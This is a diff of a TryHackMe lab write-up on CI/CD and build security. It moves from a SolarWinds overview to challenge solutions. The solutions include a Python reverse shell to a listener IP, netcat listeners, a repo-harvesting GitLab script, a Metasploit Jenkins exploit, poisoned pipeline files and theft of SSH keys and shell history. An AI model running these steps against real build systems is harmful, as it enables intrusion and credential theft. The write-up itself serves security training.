@@ -1,12 +1,9 @@
-# 🧑‍🏭🤖🧑‍🏭 **CI/CD** and Build Security
+# 🤖 **CI/CD** and Build Security
 
-* **CI/CD**: Continuous Integration and Continuous Delivery/Deployment
 * Solving [CI/CD and Build Security](https://tryhackme.com/room/cicdandbuildsecurity)
 
 ## 📌 Introduction
 Creating a secure build environment is essential to protect the software development lifecycle from threats and vulnerabilities. The **SolarWinds supply chain attack** serves as a cautionary example, underlining the importance of robust security in every phase of CI/CD.
-
----
 
 ## 🔧 Fundamentals of CI/CD (GitLab's 8 Principles)
 1. **Single Source Repository** - Centralized codebase.
@@ -18,10 +15,6 @@ Creating a secure build environment is essential to protect the software develop
 7. **Maximum Visibility** - Transparent and accessible development.
 8. **Predictable Deployments** - Low-risk, consistent release process.
 
-> 🔍 **Note:** These principles improve DevOps workflows but don’t directly address **pipeline security risks**.
-
----
-
 ## 🔄 A Typical CI/CD Pipeline
 
 **Components:**
@@ -31,16 +24,10 @@ Creating a secure build environment is essential to protect the software develop
 - 🤖 **Build Agents** – Execute build tasks (e.g., GitLab Runners)
 - 🧪 **Environments** – DEV, STAGE, PROD stages
 
-> 📌 CI/CD setups vary, but **security principles remain consistent** across implementations.
-
----
-
 ## 🛡️ The SolarWinds Case Study
 - In 2020, attackers **injected SUNBURST malware** into SolarWinds' **Orion** software via the build system.
 - Resulted in **widespread compromise** of both government and private networks.
 - Showed how a **single vulnerable vendor** can impact many organizations.
-
----
 
 ## 🔐 Key Security Measures
 
@@ -61,19 +48,9 @@ Creating a secure build environment is essential to protect the software develop
 - Validate **third-party dependencies**.
 - Monitor supplier security posture regularly.
 
----
+## Challenge Solutions
 
-## 🎯 Key Takeaways
-- Secure the entire software lifecycle, not just code.
-- Learn from **real-world breaches** like SolarWinds.
-- Focus on **proactive, layered security**: isolation, authentication, and network hardening.
-
----
-
-
----
-
-## Setup
+### Setup
 
 1. IPs to subomains
     ```sh
@@ -89,9 +66,7 @@ Creating a secure build environment is essential to protect the software develop
     ## Not Important for the Class
     ```
 
----
-
-## Create Pipeline on `GITLAB`
+### Create Pipeline on `GITLAB`
 
 1. Create User
     ```
@@ -105,15 +80,11 @@ Creating a secure build environment is essential to protect the software develop
 4. Found: `http://gitlab.tryhackme.loc/ash/basic-build`
 5. Fork it!
 
----
-
-## 👀 Eyes on `.gitlab-ci.yml`
+#### 👀 Eyes on `.gitlab-ci.yml`
 
 * This file contains **the steps** that will be **performed automatically** when a **new commit is made** to the repo
 
----
-
-## Runner
+### Create Runner on Local Machine
 
 1. Settings
 2. CI/CD
@@ -125,77 +96,62 @@ Creating a secure build environment is essential to protect the software develop
     ```sh
     sudo apt install gitlab-runner
     ```
-
----
-
-## Runner
-
 8. Copy Generated Script on Level 6 and execute it, Executor is `shell`
 9. Make a commit and it will run automatically
 10. check: `127.0.0.1:8081`
-11. Check `README.md` for **username** and **password**
+11. Check `README.md` for **username** and **password**, it is: `admin:admin`
 
 ---
 
-## Enumeration
-
-```python
-import gitlab
-import uuid
-
-# Create a Gitlab connection
-gl = gitlab.Gitlab("http://gitlab.tryhackme.loc/", private_token='REPLACE_ME')
-gl.auth()
-
-# Get all Gitlab projects
-projects = gl.projects.list(all=True)
-
-# Enumerate through all projects and try to download a copy
-for project in projects:
-    print ("Downloading project: " + str(project.name))
-    #Generate a UID to attach to the project, to allow us to download all versions of projects with the same name
-    UID = str(uuid.uuid4())
-    print (UID)
-    try:
-        repo_download = project.repository_archive(format='zip')
-        with open (str(project.name) + "_" + str(UID) +  ".zip", 'wb') as output_file:
-            output_file.write(repo_download)
-    except Exception as e:
-        # Based on permissions, we may not be able to download the project
-        print ("Error with this download")
-        print (e)
-        pass
-```
-
----
-
-## Enumeration
+### Enumeration
 
 1. Install Dependencies
     ```sh
     pip3 install python-gitlab==3.15.0
     ```
 2. Make Access Token with user already created
-3. Replace in code above
+3. Replace in code below
+  ```python
+  import gitlab
+  import uuid
+
+  # Create a Gitlab connection
+  gl = gitlab.Gitlab("http://gitlab.tryhackme.loc/", private_token='REPLACE_ME')
+  gl.auth()
+
+  # Get all Gitlab projects
+  projects = gl.projects.list(all=True)
+
+  # Enumerate through all projects and try to download a copy
+  for project in projects:
+      print ("Downloading project: " + str(project.name))
+      #Generate a UID to attach to the project, to allow us to download all versions of projects with the same name
+      UID = str(uuid.uuid4())
+      print (UID)
+      try:
+          repo_download = project.repository_archive(format='zip')
+          with open (str(project.name) + "_" + str(UID) +  ".zip", 'wb') as output_file:
+              output_file.write(repo_download)
+      except Exception as e:
+          # Based on permissions, we may not be able to download the project
+          print ("Error with this download")
+          print (e)
+          pass
+  ```
 4. Run and Get **ZIP Directories**
 5. **Extract** and Look For **Flags**
 
----
+### Build Proccess
 
-## Build Proccess
-
-0. `ip a` get `cicd` local ip! 😉
-1. Fork (http://gitlab.tryhackme.loc/ash/Merge-Test)
-2. Create `shell.sh` file
+1. `ip a` get `cicd` local ip! (**THM Stuff**) 😉
+2. Fork (http://gitlab.tryhackme.loc/ash/Merge-Test)
+3. Create `shell.sh` file
     ```sh
     /usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.50.44.89",9191)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
     ```
-3. Run on local: `python3 -m http.server 9090`
-4. Run on local: `nc -lnvp 9191`
-
----
-
-5. Edit `jenkinsfile`
+4. Run on local: `python3 -m http.server 9090`
+5. Run on local: `nc -lnvp 9191`
+6. Edit `jenkinsfile`
 ```
 pipeline {
     agent any
@@ -210,11 +166,11 @@ pipeline {
     }       
 }
 ```
-6. Send Merge Request
+7. Send Merge Request
 
 ---
 
-## Securing Build Server
+### Securing Build Server
 
 1. run `msfconsole -q`
 2. use exploit: `exploit/multi/http/jenkins_script_console`
@@ -229,7 +185,7 @@ pipeline {
 
 ---
 
-## Securing the Build Pipeline
+### Securing the Build Pipeline
 
 1. login to **Gitlab**: `anatacker`:`Password1@`
 2. Goto: `http://gitlab.tryhackme.loc/ash/approval-test`
@@ -239,9 +195,6 @@ pipeline {
     ```
 4. (if not working) Run on local: `python3 -m http.server 9090`
 5. Run on local: `nc -lnvp 9292`
-
----
-
 6. Edit `.gitlab-ci.yaml`
 ```yaml
    stages:
@@ -255,12 +208,9 @@ pipeline {
        name: ${CI_JOB_NAME}
 
 ```
-
 7. **Commit** and **Merge**!
 
----
-
-## Secure Build Environment
+### Secure Build Environment
 
 1. login to **Gitlab**: `anatacker`:`Password1@`
 2. Goto: `http://gitlab.tryhackme.loc/ash/environments/`
@@ -270,9 +220,6 @@ pipeline {
     ```
 4. (if not working) Run on local: `python3 -m http.server 9090`
 5. Run on local: `rlwrap nc -lnvp 9393`
-
----
-
 6. Edit `.gitlab-ci.yaml`
 ```yaml
 stages:
@@ -295,9 +242,6 @@ production:
     name: ${CI_JOB_NAME}
 
 ```
-
----
-
 7. **Commit** and **Merge**!
 8. Go to `.ssh` directory, access **SSH Private Keys**
 9. Check History: `cat ~/.bash_history` 😉
@@ -311,9 +255,7 @@ production:
     ssh -i ~/.ssh/id_rsa ubuntu@10.200.59.230
     ```
 
----
-
-## Build Secrets
+### Build Secrets
 
 1. login to **Gitlab**: `anatacker`:`Password1@`
 2. Goto: `http://gitlab.tryhackme.loc/ash/environments/`
@@ -338,5 +280,4 @@ production:
     name: ${CI_JOB_NAME}
 
 ```
-
 7. **Commit** and **Merge**!
